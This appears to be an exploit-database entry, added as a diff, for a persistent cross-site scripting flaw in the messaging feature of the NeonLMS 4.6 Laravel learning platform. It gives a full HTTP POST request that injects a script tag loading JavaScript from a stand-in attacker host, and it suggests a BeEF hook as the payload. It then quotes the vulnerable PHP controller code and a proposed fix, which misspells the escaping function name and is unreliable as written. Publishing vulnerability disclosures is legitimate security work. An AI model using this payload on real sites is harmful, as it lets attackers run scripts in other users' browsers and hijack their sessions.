@@ -1,0 +1,71 @@
+id: 34532
+date: 06/08/2020
+title: NeonLMS Learning Management System PHP Laravel Script 4.6 XSS Vulnerability
+author: th3d1gger
+cves: 
+
+# Exploit Title: NeonLMS - Learning Management System PHP Laravel Script - 'Messages' Persistent Cross Site Scripting
+# Exploit Author: th3d1gger
+# Vendor Homepage: https://www.neonlms.com/
+# Software Link: https://codecanyon.net/item/neonlms-learning-management-system-php-laravel-script/23641351
+# Affected Version: 4.6
+# Tested on: Windows
+# CVE : N/A
+
+#Vulnerable Request:
+POST /user/messages/reply HTTP/1.1
+
+Host: neonlmshost
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://neonlmshost/user/messages?thread=1
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 117
+
+
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+
+
+_token=GTpbr2our96dPg1Ojk0C1MyVWr03naCDSgGqfl2J&thread_id=1&message=<script src="//attackerhost/b.js">
+
+
+#Vulnerable code
+
+payload must be lesser than 35 characters so attacker can only include external js or some kind of beef hook etc.
+
+app\Http\Controllers\Backend\MessagesController.php
+
+public function getUnreadMessages(Request $request){
+        $unreadMessageCount = auth()->user()->unreadMessagesCount;
+        $unreadThreads = [];
+        foreach(auth()->user()->threads as $item){
+            if($item->unreadMessagesCount > 0){
+                $data = [
+                  'thread_id' => $item->id,
+                  'message' => str_limit($item->lastMessage->body, 35), ------>vulnerable part
+                  'unreadMessagesCount' => $item->unreadMessagesCount,
+                  'title' => $item->title
+                ];
+                $unreadThreads[] = $data;
+            }
+        }
+        return ['unreadMessageCount' =>$unreadMessageCount,'threads' => $unreadThreads];
+    }
+
+#fix
+'message' => html_entitites(str_limit($item->lastMessage->body, 35)),
+
+#  0day.today [2023-03-25]  #
